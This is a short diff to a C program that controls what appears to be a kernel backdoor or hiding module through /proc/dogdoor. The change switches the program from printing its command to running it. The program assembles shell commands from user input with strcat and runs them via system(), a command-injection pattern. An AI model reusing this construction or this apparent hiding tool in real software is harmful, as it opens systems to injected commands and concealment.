@@ -14,8 +14,8 @@ int main() {
 	char pid[50] = "";
 	char u_name[50] = "";
 //    const char* PROC_PATH = "/proc/dogdoor";
-    const char* command_echo1 = "exec echo ";
-    const char* command_echo2 = " > /proc/dogdoor";
+    const char* command_echo1 = "exec echo \"";
+    const char* command_echo2 = "\" > /proc/dogdoor";
     const char* command_cat = "exec cat /proc/dogdoor";
     bool hiding = false;
     while(1) {
@@ -40,7 +40,8 @@ int main() {
 			strcat(command,"u");
 			strcat(command,u_id_str);
 			strcat(command,command_echo2);
-			printf("%s\n",command);
+//			printf("%s\n",command);
+			system(command);
 		}
 		else if(ss == 2) {
 			system(command_cat);
